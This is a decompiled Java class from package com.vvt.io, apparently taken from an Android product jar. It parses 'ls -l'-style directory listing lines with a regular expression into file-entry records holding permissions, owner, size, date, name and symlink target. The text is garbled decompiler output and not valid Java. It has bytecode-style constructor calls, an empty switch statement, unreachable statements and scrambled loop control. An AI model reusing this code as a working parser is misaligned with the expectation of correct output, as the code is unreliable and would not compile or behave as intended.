package com.vvt.io;

import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public final class b
{
  private static Pattern a = Pattern.compile("^([bcdlsp-][-r][-w][-xsS][-r][-w][-xsS][-r][-w][-xstST])\\s+(\\S+)\\s+(\\S+)\\s+([\\d\\s,]*)\\s+(\\d{4}-\\d\\d-\\d\\d)\\s+(\\d\\d:\\d\\d)\\s+(.*)$");
  
  public static c a(String paramString)
  {
    Object localObject = new java/util/ArrayList;
    ((ArrayList)localObject).<init>();
    ((ArrayList)localObject).add(paramString);
    String[] arrayOfString = new String[((ArrayList)localObject).size()];
    localObject = a((String[])((ArrayList)localObject).toArray(arrayOfString));
    int i = ((List)localObject).size();
    if (i > 0)
    {
      i = 0;
      arrayOfString = null;
    }
    for (localObject = (c)((List)localObject).get(0);; localObject = null) {
      return (c)localObject;
    }
  }
  
  public static List a(String[] paramArrayOfString)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    int i = paramArrayOfString.length;
    int j = 0;
    Object localObject1 = null;
    int k = 0;
    if (k < i)
    {
      localObject1 = paramArrayOfString[k];
      int m = ((String)localObject1).length();
      if (m == 0) {}
      do
      {
        j = k + 1;
        k = j;
        break;
        localObject2 = a;
        localObject1 = ((Pattern)localObject2).matcher((CharSequence)localObject1);
        bool1 = ((Matcher)localObject1).matches();
      } while (!bool1);
      String str1 = ((Matcher)localObject1).group(7);
      String str2 = ((Matcher)localObject1).group(1);
      String str3 = ((Matcher)localObject1).group(2);
      String str4 = ((Matcher)localObject1).group(3);
      String str5 = ((Matcher)localObject1).group(4);
      String str6 = ((Matcher)localObject1).group(5);
      String str7 = ((Matcher)localObject1).group(6);
      boolean bool1 = false;
      Object localObject2 = null;
      j = 8;
      Object localObject3 = null;
      int n = str2.charAt(0);
      switch (n)
      {
      }
      for (;;)
      {
        n = 5;
        if (j == n)
        {
          localObject3 = str1.split("\\s->\\s");
          int i1 = localObject3.length;
          int i2 = 2;
          if (i1 == i2)
          {
            str1 = localObject3[0];
            bool1 = true;
            localObject2 = localObject3[bool1];
            localObject3 = ((String)localObject2).split("/");
            i1 = localObject3.length;
            i2 = 1;
            if (i1 == i2)
            {
              str8 = "..";
              i2 = 0;
              localObject3 = localObject3[0];
              boolean bool2 = str8.equals(localObject3);
              if (bool2) {
                j = 2;
              }
            }
          }
          localObject3 = new java/lang/StringBuilder;
          ((StringBuilder)localObject3).<init>();
          String str8 = "-> ";
          localObject3 = ((StringBuilder)localObject3).append(str8);
          localObject2 = (String)localObject2;
        }
        localObject3 = new com/vvt/io/c;
        ((c)localObject3).<init>();
        ((c)localObject3).b = str1;
        ((c)localObject3).d = str2;
        ((c)localObject3).e = str5;
        ((c)localObject3).f = str6;
        ((c)localObject3).g = str7;
        ((c)localObject3).h = str3;
        ((c)localObject3).i = str4;
        ((c)localObject3).j = j;
        int i3 = 5;
        if (j == i3) {
          ((c)localObject3).c = ((String)localObject2);
        }
        localArrayList.add(localObject3);
        break;
        j = 0;
        localObject1 = null;
        continue;
        j = 3;
        continue;
        j = 4;
        continue;
        j = 1;
        continue;
        j = 5;
        continue;
        j = 6;
        continue;
        j = 7;
      }
    }
    return localArrayList;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/io/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */